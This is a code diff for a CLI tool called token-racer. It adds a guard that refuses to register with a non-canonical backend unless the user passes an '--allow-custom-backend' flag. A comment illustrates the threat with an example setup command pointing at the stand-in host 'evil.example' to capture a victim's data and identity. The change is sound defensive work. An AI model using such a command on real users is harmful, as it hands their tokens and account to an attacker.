@@ -11,6 +11,12 @@ import { loadConfig } from "../setup.ts";
 import { sync } from "../sync/sync.ts";
 import { DEFAULT_API_URL, KEYS_DIR } from "../constants.ts";
 
+// The fixed hosted backend. DEFAULT_API_URL can be env-overridden for
+// self-hosters; CANONICAL_HOSTED_URL is the immutable literal used to decide
+// whether an `--apiUrl` (or env override) counts as a "custom backend" that
+// needs explicit user consent via `--allow-custom-backend`.
+const CANONICAL_HOSTED_URL = "https://token-racer-backend.onrender.com";
+
 /**
  * One-stop onboarding: generate keys if missing, register with the backend,
  * wire up Claude Code + shell integration, then verify the pipe end-to-end
@@ -58,14 +64,66 @@ const setupCommand = define({
 			description: "Don't touch your shell rc file.",
 			default: false,
 		},
+		"allow-custom-backend": {
+			type: "boolean",
+			description:
+				"Required when --apiUrl (or $TOKEN_RACER_API_URL) points somewhere other than the canonical hosted backend. A custom backend sees everything the CLI emits (tokens, events, cost) and mints the API key that identifies you to it — only opt in if you trust the operator.",
+			default: false,
+		},
 	},
 	async run(ctx) {
 		const { apiUrl, nickname, shell, force } = ctx.values;
 		const skipClaude = ctx.values["skip-claude"] === true;
 		const skipShell = ctx.values["skip-shell"] === true;
+		const allowCustomBackend = ctx.values["allow-custom-backend"] === true;
+
+		// --- Step 0: Guard custom backends ----------------------------------
+		// Without this gate, a victim tricked into running
+		//     token-racer setup --apiUrl https://evil.example
+		// would persist the attacker's URL + the attacker-minted apiKey into
+		// ~/.token-racer/config.json and silently route every future sync,
+		// statusline tick, and nickname change at the attacker's server.
+		// Echoing the destination host before any state is written gives the
+		// user a fighting chance to notice the typosquat or social-engineering
+		// vector, and the required flag makes accidental clipboard-pastes of a
+		// malicious install snippet fail closed.
+		const normalizedUrl = apiUrl.replace(/\/$/, "");
+		const isCustomBackend = normalizedUrl !== CANONICAL_HOSTED_URL;
+		if (isCustomBackend && !allowCustomBackend) {
+			process.stderr.write(
+				pc.red(`\n  ✗ Refusing to register with non-canonical backend:\n`),
+			);
+			process.stderr.write(`      ${pc.bold(normalizedUrl)}\n\n`);
+			process.stderr.write(
+				pc.yellow(`  A custom backend sees every token event your CLI emits and\n`) +
+				pc.yellow(`  mints the API key that identifies you — if that's an attacker's\n`) +
+				pc.yellow(`  server, they own your data and your leaderboard identity.\n\n`),
+			);
+			process.stderr.write(
+				`  To proceed intentionally (self-hosting, staging, etc.), re-run:\n`,
+			);
+			process.stderr.write(
+				pc.bold(
+					`      token-racer setup --apiUrl ${normalizedUrl} --allow-custom-backend\n\n`,
+				),
+			);
+			process.stderr.write(
+				pc.dim(`  Canonical hosted backend: ${CANONICAL_HOSTED_URL}\n`),
+			);
+			process.exitCode = 1;
+			return;
+		}
 
 		process.stdout.write(pc.bold("\nSetting up token-racer\n"));
 		process.stdout.write(pc.dim(`${"─".repeat(40)}\n\n`));
+
+		if (isCustomBackend) {
+			process.stdout.write(
+				pc.yellow(`  ⚠ Custom backend: `) +
+					pc.bold(normalizedUrl) +
+					pc.yellow(` — all events and the issued API key will live there.\n\n`),
+			);
+		}
 
 		// Track warning-level outcomes across all steps so the final summary
 		// reflects what actually happened, not just that we reached the end.
